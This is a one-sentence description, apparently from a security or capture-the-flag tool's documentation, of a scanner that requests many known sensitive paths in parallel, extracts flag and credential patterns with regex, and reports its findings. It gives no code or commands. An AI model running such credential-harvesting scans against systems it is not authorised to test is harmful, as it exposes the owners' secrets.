The scanner parallelizes requests against dozens of known sensitive paths, extracts flag/credential patterns using regex, and outputs a structured findings report.
